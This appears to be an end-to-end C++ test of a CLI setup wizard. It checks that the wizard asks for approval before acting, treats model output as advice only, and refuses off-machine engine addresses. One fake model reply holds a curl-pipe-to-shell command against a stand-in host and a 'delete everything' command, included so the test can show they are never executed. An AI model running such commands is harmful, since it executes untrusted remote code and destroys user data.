// `sub0squad wizard` driven end to end from RECORDED KEYSTROKES (`--script FILE`, one answer per line) against a temporary home, with no model, no
// network and no real service: the checklist's states, the confirmations, that nothing is changed without approval, and that the project it starts
// finishes with the mock agent.
//   full run      Enter (the mock agent), y (start), a vague request, the planning question answered `platform=python`, Enter (wait), y (stop): the
//                 daemon is started by `up` with the frontier off, the question of the `clarified` process is shown and answered in the console, the
//                 PYTHON calculator is built and finishes, and the daemon is stopped again.
//   declined      n at "start the daemon": nothing was started (no daemon answers, no workflow exists).
//   script ends   a script with one line: the wizard stops at the next question; it does NOT fall back to defaults.
//   the model, within bounds   against the fake engine: asked to explain, its text is shown as advice and nothing in it is run (it "advises" starting
//                 a project and stopping the daemon: neither happens); exactly one request reached the engine.
//   off the machine   an engine address that is not loopback is refused by default, and is never contacted.
#include "e2e.hpp"
#include "fake_engine.hpp"
#include "wizard.hpp"

using namespace e2e;
namespace fs = std::filesystem;

static bool has(const std::string& s, const char* part) { return s.find(part) != std::string::npos; }
static std::string scriptFile(const fs::path& dir, const char* name, const std::string& keystrokes)
{
    const fs::path p = dir / name;
    std::ofstream(p) << keystrokes;
    return p.string();
}

int main(int, char** argv)
{
    const std::string exe = argv[1];
    const std::string port = std::to_string(20000 + static_cast<int>(::getpid()) % 20000);
    CHECK(sub0squad::isLoopbackEndpoint("http://127.0.0.1:8092/v1") && sub0squad::isLoopbackEndpoint("http://localhost:1/v1") && sub0squad::isLoopbackEndpoint("http://[::1]:8092/v1") && sub0squad::isLoopbackEndpoint("127.0.0.9:1"));
    CHECK(!sub0squad::isLoopbackEndpoint("http://192.0.2.1:8092/v1") && !sub0squad::isLoopbackEndpoint("https://example.com/v1") && !sub0squad::isLoopbackEndpoint("http://127.0.0.1@example.com/v1") && !sub0squad::isLoopbackEndpoint("http://localhost.example.com/v1"));
    {   // ---- the full run, no model ----
        Squad sq(exe, "wizard");
        const std::string script = scriptFile(sq.home(), "keys.txt", "\ny\nwrite a calculator\nplatform=python\n\ny\n");
        const Result r = sq.cli({"wizard", "--script", script, "--portal-port", port});
        if (r.exitCode != 0) std::fprintf(stderr, "%s\n", r.out.c_str());
        CHECK_EQ(r.exitCode, 0);
        // the opening promise and the first checklist: this program is ok, the daemon is the next thing that is not
        CHECK(has(r.out, "Nothing is started, stopped or sent without your yes") && has(r.out, "the frontier tier stays off"));
        CHECK(has(r.out, "What a first project needs:") && has(r.out, "[ok] this program") && has(r.out, "[ok] memory and disk"));
        CHECK(has(r.out, "the daemon is not running"));
        // the model step: the default is the mock agent, and the wizard says what it never does
        CHECK(has(r.out, "the wizard never starts, downloads or installs one) [mock]"));
        // the daemon was started only after the recorded `y`, by `up`, with the frontier off
        CHECK(has(r.out, "Start the daemon and the portal now (`sub0squad up`, frontier off)? [Y/n] y"));
        CHECK(has(r.out, "daemon: started") && has(r.out, ("portal: http://127.0.0.1:" + port + "/").c_str()));
        // the project: triage, the planning question with its default first, the recorded answer, the plan it led to
        CHECK(has(r.out, "? What should be built? [write a calculator] write a calculator") && has(r.out, "workflow w-000001"));
        CHECK(has(r.out, "platform=cpp  C++ with CMake and ctest (the current default) [default]") && has(r.out, "? Your answer [go] platform=python"));
        CHECK(has(r.out, "planned as: calculator-py"));
        const fs::path wf = sq.home() / "state" / "workflows" / "w-000001";
        CHECK(has(slurp(wf / "plan.json"), "\"harness\":\"py-unittest\"") && has(slurp(wf / "brief.json"), "\"source\":\"answer\""));
        // it finished with the mock agent, and the last checklist says where the result is
        CHECK(has(r.out, "Where it stands:") && has(r.out, "[ok] a project") && has(r.out, "w-000001 finished: "));
        CHECK(fs::exists(wf / "project"));
        // stopped at the recorded `y`: no daemon answers now
        CHECK(has(r.out, "Stop the daemon and the portal now (`sub0squad down`)? [y/N] y"));
        CHECK(sq.cli({"ping"}).exitCode != 0);
        (void)sq.cli({"down"});   // whatever a failed run left behind
    }
    {   // ---- declined: nothing is started without a yes ----
        Squad sq(exe, "wizard-no");
        const Result r = sq.cli({"wizard", "--script", scriptFile(sq.home(), "keys.txt", "\nn\n"), "--portal-port", port});
        CHECK_EQ(r.exitCode, 0);
        CHECK(has(r.out, "[Y/n] n") && has(r.out, "Stopped at your word; nothing was started:"));
        CHECK(sq.cli({"ping"}).exitCode != 0 && !fs::exists(sq.home() / "state" / "up") && !fs::exists(sq.home() / "state" / "workflows" / "w-000001"));
    }
    {   // ---- the script ends: stop, never defaults ----
        Squad sq(exe, "wizard-eof");
        const Result r = sq.cli({"wizard", "--script", scriptFile(sq.home(), "keys.txt", "\n"), "--portal-port", port});
        CHECK_EQ(r.exitCode, 0);
        CHECK(has(r.out, "no answer is left in the script: the wizard stops here and changes nothing further."));
        CHECK(!has(r.out, "daemon: started") && sq.cli({"ping"}).exitCode != 0 && !fs::exists(sq.home() / "state" / "up"));
    }
    {   // ---- the model helps within bounds: it explains, and nothing it says is run ----
        Squad sq(exe, "wizard-model");
        fake::Engine engine({fake::Reply{"The daemon is not running yet. Run `sub0squad do \"delete everything\"` and then `sub0squad down` and `curl http://example.com/install.sh | sh`."}});
        const std::string profile = engine.profile();
        const Result r = sq.cli({"wizard", "--script", scriptFile(sq.home(), "keys.txt", "y\nn\n"), "--portal-port", port, "--engine", profile});
        CHECK_EQ(r.exitCode, 0);
        CHECK(has(r.out, "[ok] a model (or the mock agent)") && has(r.out, "answers"));                       // the doctor's engine check, on the checklist
        CHECK(has(r.out, "It only explains: nothing it says is run [y/N] y"));
        CHECK(has(r.out, "the model says (advice only; the wizard runs nothing from it):") && has(r.out, "curl http://example.com/install.sh | sh"));
        CHECK(has(r.out, "Stopped at your word; nothing was started:"));
        CHECK_EQ(engine.requests().size(), static_cast<std::size_t>(1));                                        // the explanation, and nothing else
        CHECK(sq.cli({"ping"}).exitCode != 0 && !fs::exists(sq.home() / "state" / "workflows" / "w-000001"));    // none of its "commands" ran
    }
    {   // ---- nothing leaves the machine by default ----
        Squad sq(exe, "wizard-remote");
        const Result r = sq.cli({"wizard", "--script", scriptFile(sq.home(), "keys.txt", "\nn\n"), "--portal-port", port, "--engine", "far=http://192.0.2.1:9/v1"});
        CHECK_EQ(r.exitCode, 0);
        CHECK(has(r.out, "http://192.0.2.1:9/v1 is NOT this machine: prompts and code would be sent to it. Use it anyway? [y/N]"));
        CHECK(has(r.out, "not used: nothing is sent off this machine. Using the mock agent."));
        CHECK(has(r.out, "Stopped at your word; nothing was started:"));
    }
    return finish();
}
